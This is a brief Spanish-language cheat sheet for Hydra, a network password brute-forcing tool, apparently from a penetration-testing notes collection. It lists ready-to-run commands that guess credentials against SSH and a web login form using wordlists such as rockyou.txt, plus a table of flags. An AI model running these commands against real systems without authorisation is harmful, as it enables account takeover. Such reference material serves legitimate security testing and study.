# 🐉 Hydra

Hydra es una herramienta de fuerza bruta para servicios de autenticación en red. Soporta SSH, FTP, HTTP, SMB, RDP, MySQL y decenas de protocolos más.

---

## Sintaxis general

```bash
hydra -l <usuario> -P <diccionario> <protocolo>://<objetivo>
```

---

## Casos de uso

### Fuerza bruta SSH — usuario conocido

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10
```

### Fuerza bruta SSH — encontrar usuario

```bash
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -p Password123 ssh://192.168.1.10
```

### Fuerza bruta formulario web (POST)

```bash
hydra -l admin -P rockyou.txt 192.168.1.10 \
  http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid credentials"
```

El formato de `http-post-form` es: `"ruta:parámetros:mensaje_de_error"`

- `^USER^` — placeholder para el usuario
- `^PASS^` — placeholder para la contraseña
- El tercer campo es la cadena que aparece en la respuesta cuando el login falla

---

## Parámetros útiles

| Flag | Descripción |
|---|---|
| `-l` | Usuario fijo |
| `-L` | Lista de usuarios |
| `-p` | Contraseña fija |
| `-P` | Lista de contraseñas |
| `-f` | Para al encontrar la primera credencial válida |
| `-t` | Número de tareas paralelas (hilos), por defecto 16 |
| `-s` | Puerto alternativo |
| `-v` | Modo verbose |

---

## Referencias

- [SecLists](https://github.com/danielmiessler/SecLists) — Diccionarios de usuarios y contraseñas
- [Diccionarios personalizados](diccionarios-personalizados.md) — Generar listas específicas para el objetivo
